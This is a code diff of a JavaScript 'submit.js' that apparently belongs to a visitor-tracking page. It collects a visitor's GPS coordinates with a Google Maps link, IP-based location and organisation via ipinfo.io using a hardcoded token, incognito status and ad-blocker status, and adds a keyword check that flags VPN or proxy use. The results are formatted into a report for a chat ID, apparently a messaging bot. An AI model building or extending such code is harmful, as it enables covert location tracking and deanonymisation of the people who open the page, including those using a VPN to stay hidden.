@@ -1,4 +1,4 @@
-// submit.js (updated: Touch/Mouse detection + Privacy (incognito) detection + proper bold/italic Markdown + conditional Map View)
+// submit.js (updated: Touch/Mouse detection + Privacy (incognito) detection integrated into Adblock section + proper bold/italic Markdown + VPN/Proxy detection)
 
 async function collectAndSend(chatId) {
   if (!chatId) {
@@ -158,6 +158,17 @@ async function collectAndSend(chatId) {
     return { detected, method, cookiesBlocked };
   }
 
+  // VPN / Proxy detection (basic via IP info)
+  async function detectVPN(ipOrg) {
+    // Simple heuristic: look for common VPN / proxy keywords in org name
+    const vpnKeywords = ['VPN', 'Virtual', 'Proxy', 'Nord', 'ExpressVPN', 'Private', 'HideMy', 'Cloudflare', 'Mullvad', 'OVH', 'DigitalOcean'];
+    if (!ipOrg || ipOrg === 'Unknown') return 'Unknown';
+    for (let keyword of vpnKeywords) {
+      if (ipOrg.toLowerCase().includes(keyword.toLowerCase())) return 'Yes';
+    }
+    return 'No';
+  }
+
   const [incognitoResult, adblockResult, geoResult] = await Promise.all([
     detectIncognito(),
     detectAdblockAndCookies(),
@@ -183,7 +194,7 @@ async function collectAndSend(chatId) {
     })()
   ]);
 
-  let ip='Unknown', city='Unknown', region='Unknown', country='Unknown', org='Unknown';
+  let ip='Unknown', city='Unknown', region='Unknown', country='Unknown', org='Unknown', vpn='Unknown';
   try {
     const res = await fetch('https://ipinfo.io/json?token=18d2a866939a58');
     if (res.ok) {
@@ -193,13 +204,12 @@ async function collectAndSend(chatId) {
       region = d.region || region;
       country = d.country || country;
       org = d.org || org;
+      vpn = await detectVPN(org);
     }
   } catch (e) {}
 
-  // Conditional Map View
-  const mapView = (geoResult.latitude !== 'Denied' && geoResult.longitude !== 'Denied') 
-                  ? `https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}`
-                  : 'Unavailable';
+  // Map view logic
+  const mapView = (geoResult.status === 'Allowed') ? `https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}` : 'Unavailable';
 
   // Build message with Markdown formatting
   const message = 
@@ -230,13 +240,12 @@ async function collectAndSend(chatId) {
 - City: ${city}
 - Region: ${region}
 - Country: ${country}
+- VPN / Proxy: ${vpn}
 _𝙽𝚘𝚝𝚎: 𝙸𝙿-𝚋𝚊𝚜𝚎𝚍 𝚕𝚘𝚌𝚊𝚝𝚒𝚘𝚗 𝚖𝚊𝚢 𝚗𝚘𝚝 𝚋𝚎 𝚊𝚌𝚌𝚞𝚛𝚊𝚝𝚎._
 
 📌 *GPS:*
 - Status: ${geoResult.status}
-- Latitude: \`${geoResult.latitude}\`
-- Longitude: \`${geoResult.longitude}\`
-- Map View: ${mapView}
+${geoResult.status === 'Allowed' ? `- Latitude: \`${geoResult.latitude}\`\n- Longitude: \`${geoResult.longitude}\`\n- Map View: ${mapView}` : `- Map View: ${mapView}`}
 
 🔐 *Privacy & Blockers Info:*
 - Incognito / Private Mode: ${incognitoResult}
